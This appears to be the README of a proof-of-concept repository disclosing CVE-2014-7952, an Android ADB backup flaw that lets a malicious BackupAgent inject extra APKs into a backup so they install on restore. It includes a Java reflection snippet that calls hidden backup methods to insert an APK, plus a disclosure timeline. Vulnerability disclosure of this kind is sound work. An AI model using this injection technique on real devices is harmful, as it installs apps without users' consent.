# ADB-Backup-APK-Injection
Android ADB backup APK Injection POC

What is ADB backup/restore?
---------------------------
The Android Operating System offers a backup/restore mechanism of installed packages through the ADB utility.
By default, full backup of applications including the private files stored in /data is performed, but this behaviour can be customized by implementing a BackupAgent (http://developer.android.com/reference/android/app/backup/BackupAgent.html) class. This way applications can feed the backup process with custom files and data.
The backup file created is a simple compressed tar archive with some Android specific headers. Optional encryption is also possible.

APK Injection issue
-------------------
The backup manager, which invokes the custom BackupAgent's does not filter the data stream returned. A malicious BackupAgent is able to inject additional applications (APKs) into the backup archive, while it is being executed during the backup process without the user's consent. Upon restoration of the backup archive, the system installs the injected, additional application.
The Backup Manager can be exploited through simple reflection:

```
	  String packageName = "com.searchlab.wifitest"; // getPackageName();
	  
	  Method backupToTar;
	  Method getData;
		try {
			Class<?> fullbackupClass = Class.forName("android.app.backup.FullBackup");

			Class<?> backupDataOutputClass = Class.forName("android.app.backup.BackupDataOutput");
			
			backupToTar = fullbackupClass.getDeclaredMethod("backupToTar", String.class, String.class, String.class, String.class, String.class, backupDataOutputClass);
			backupToTar.setAccessible(true);		
			
			getData = FullBackupDataOutput.class.getDeclaredMethod("getData");
			 getData.setAccessible(true);
			 Object backupData = getData.invoke(data);
			
			 
			backupToTar.invoke(null, packageName, null, null, getFilesDir().toString(), getFilesDir()+"/_manifest", backupData);
			backupToTar.invoke(null, packageName, "a", null, getFilesDir().toString(),getFilesDir()+"/com.searchlab.wifitest-1.apk", backupData);
		    
			Log.v("MYBACKUP", "backuptotar invoked!");
			
			/*
			FullBackup.backupToTar(getPackageName(), domain, null, rootpath, filePath, output.getData());
			Class<?> hs = Class.forName("java.util.HashSet");
			m = BackupAgent.class.getDeclaredMethod("fullBackupFileTree", String.class, String.class, String.class, hs, FullBackupDataOutput.class);
	      //m.invoke(d);//exception java.lang.IllegalAccessException
	      m.setAccessible(true);//Abracadabra 
	      m.invoke(this, packageName, "", "/data/tmp/evilApk", null, data);//now its ok
	      */
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
```

CVE
---
The ID CVE-2014-7952 was assigned to this vulnerability.

Affected Versions
-----------------
As of today, 2015-07-08, all Android versions are affected, including Android L.

Timeline
--------
At first, Google did not acknowledge the issue being security relevant. Later they kept requesting more time for further investigation, but the bug was still not addressed. The most important milestones of the issue are listed in the next lines:

2014-07-14: The vulnerability was disclosed to the Android security team
2014-07-28: Google refused to treat the issue as a potential threat, but requests to hold off publishing it
2014-10-15: Google answered that it did not get fixed in the L release and keeps requesting to hold off publishing it
2015-06-02: Google promised further info in a few days, but it never arrived
